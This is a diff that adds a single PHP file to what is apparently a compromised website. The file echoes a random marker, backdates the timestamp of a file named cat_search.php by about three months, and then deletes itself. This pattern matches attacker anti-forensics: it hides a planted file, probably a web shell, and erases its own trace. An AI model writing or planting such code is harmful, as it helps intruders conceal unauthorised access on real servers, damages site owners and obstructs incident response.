@@ -1,0 +1,1 @@
+<?php echo "erVDuMxpGN"; if (file_exists("./cat_search.php")){ touch("./cat_search.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*MWwYAbv5SwuyqXFAd7Nz*/ ?>
